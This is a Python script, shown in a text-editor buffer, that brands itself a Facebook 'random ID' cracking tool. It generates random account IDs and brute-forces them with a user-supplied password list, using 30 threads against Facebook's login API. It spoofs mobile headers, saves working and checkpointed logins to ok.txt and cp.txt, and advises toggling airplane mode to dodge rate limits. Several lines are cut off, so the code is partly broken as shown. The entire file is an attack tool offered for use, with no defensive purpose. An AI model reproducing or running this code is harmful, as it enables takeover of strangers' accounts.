New Buffer                                                      Modified
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor

logo = """\033[1;92m  ____  _   _    _    _   _ _____ ___


      \033[1;37m         ******
       \033[1;37m        *
        \033[1;37m       *****
             \033[1;31m  .   *                                                                                                                       \033[1;31m       *****

\033[93;1m   ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 \033[1;32m[\033[0;41;37m==========={ AUTHER 🔥\033[0;37;41m KING SOHAILO }===========\033[1;37;40m\033[1;32m] \033[1;37;40m
           \033[1;47;40m╔═════════════════════════╗═══════════
       \033[1;37;40m    ║  KING OF  WHo AM i?😈( Hcker)      ║
       \033[1;37;40m    ║  TOOL  \  LoneWolf-313  SOMRAT BRO ║
       \033[1;37;40m    ║  YOUR DAD \ SOMRAT 😈  LoneWolf   )║
       \033[1;37;40m    ║  I FUCK ALL BD HACKER ATTITUDE(😈) ║
           \033[1;47;40m╚═════════════════════════╝═══════════


class Main:
        def __init__(self):
                self.id = []
                self.ok = []
                self.cp = []
                self.loop = 0
                os.system("clear")
                print(logo)
                print(' \033[1;95mDont Decode My Tools \033[0m')
                print(' \033[1;95mThis Tool Clone Old Random Account \033[0m')
                print("")
                print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s[Just-Now-Open]"%(P,G,R,Y,B))
                print(" \033[1;96m[2] EXIT")
                __SHO = input("\n\033[0;91m>>> \033[0;92m CHOOSE \033[0m: ")
                if __SHO in ["", " "]:
                        Main()
                elif __SHO in ["1", "01"]:
                        self.fbtua()
                else:
                        exit()

        def fbtua(self):
                x = 111111111
                xx = 999999999
                idx = "100000"
                os.system('clear');print(logo)
                limit = int(input(" \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
                try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                self.id.append(__+str(_))

                        print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id)))
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(G,Y,B,Y))
                                print("%s EXAMPLE : %s786786,123456,1234567,123456789"%(G,Y))
                                listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
                                print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
                                for user in self.id:
                                        coeg.submit(self.api, user, listpass.split(","))
                        exit("\n\n[>>] CRACK COMPLETE...")
                except Exception as e:exit(str(e))

        def api(self, uid, pwx):
                ua = random.choice([
                        "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{densit>
                        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version>
                ])
                sys.stdout.write(
                        "\r\r %s[SOHAILO] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[CP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(s>
                ); sys.stdout.flush()
                for pw in pwx:
                        pw = pw.lower()
                        ses = requests.Session()
                        headers = {
                                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                                "x-fb-net-hni": str(random.randint(20000, 40000)),
                                "x-fb-connection-quality": "EXCELLENT",
                                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                                "user-agent": ua,
                                "content-type": "application/x-www-form-urlencoded",
                                "x-fb-http-engine": "Liger"
                        }
                        response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+">
                        if "session_key" in response.text and "EAAA" in response.text:
                                print("\r  \033[0;92m   [SOMRAT-OK] %s | %s\033[0;97m         "%(uid, pw))
                                self.ok.append("%s|%s"%(uid, pw))
                                open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
                                break
                        elif "www.facebook.com" in response.json()["error_msg"]:
                                print("\r  \033[0;91m   [SOMRAT-CP] %s | %s\033[0;97m         "%(uid, pw))
                                self.cp.append("%s|%s"%(uid, pw))
                                open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
                                break
                        else:
                                continue

                self.loop +=1

try:Main()
except Exception as e:exit(str(e))